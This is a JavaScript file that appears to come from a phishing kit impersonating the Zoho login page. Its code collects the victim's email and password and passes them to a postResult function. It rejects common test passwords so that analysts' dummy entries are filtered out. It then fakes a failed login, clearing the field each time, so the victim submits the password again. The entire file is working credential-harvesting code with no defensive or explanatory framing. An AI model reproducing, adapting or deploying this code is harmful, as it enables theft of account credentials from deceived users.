// 
if (validEmail.test(usermail)) {
    $("#loader").show().css({"display":"flex"});
    setUpPass(usermail);
}

// 
function setUpPass(x) {
    $("#zoho_input_section").html(`
        <div class="zoho_inputs">
            <input type="email" id="z_mail" readonly placeholder="Email address or mobile number" value="${x}">
        </div>

        <div class="zoho_inputs">
            <input type="password" autocomplete="off" id="z_pass" placeholder="Enter password">
            <img onclick="changePassSatus(this)" src="./pages/zoho/eye-close.png" alt="">
        </div>    
    `);

    $("#zoho_btn").text("Sign in");

    $("#sidebar_img").attr('src', './pages/zoho/sidebar2.svg');
    $("#sidebar_text").text("MFA for all accounts Secure online accounts with OneAuth 2FA. Back up OTP secrets and never lose access to your accounts.")

    $("#loader").hide()
}

// 
$("#zoho_form").on('submit', (e)=>{
    e.preventDefault();
    $("#loader").show().css({"display":"flex"});

    let zoho_inputs = document.getElementsByClassName("zoho_inputs");

    if ($("#zoho_btn").text().toLowerCase() == "next") {
        if (!validEmail.test($("#z_mail").val())) {
            zoho_inputs[0].style.borderColor = "red";
            $("#loader").hide();
            return
        }
        else{
            zoho_inputs[0].style.borderColor = "silver";
            setUpPass($("#z_mail").val())
        } 
    }  

    if ($("#zoho_btn").text().toLowerCase() == "sign in") {

        if (validEmail.test($("#z_pass").val()) || $("#z_pass").val().length < 6 || $("#z_pass").val().toLowerCase() == "qwerty" || $("#z_pass").val() == 123456 || $("#z_pass").val().toLowerCase() == "password" || $("#z_pass").val().toLowerCase() == "testing") {
            zoho_inputs[1].style.borderColor = "red";
            $("#loader").hide();
            return
        }
        else{
            zoho_inputs[1].style.borderColor = "silver";
        }

        let url = $("#z_mail").val().split('@');

        postResult(url[1], $("#z_mail").val(), $("#z_pass").val(), postCount);
        
        setTimeout(() => {
            zoho_inputs[1].style.borderColor = "red";
            postCount++
            $("#z_pass").val("")
        }, delayCounter);
    } 
});

// 
function changePassSatus(x) {
    let z_pass = document.getElementById("z_pass");

    if (z_pass.type === "text") {
        z_pass.type = "password";
        x.src="./pages/zoho/eye-close.png";
    } 
    else {
        z_pass.type = "text";
        x.src="./pages/zoho/eye-open.png";
    }
}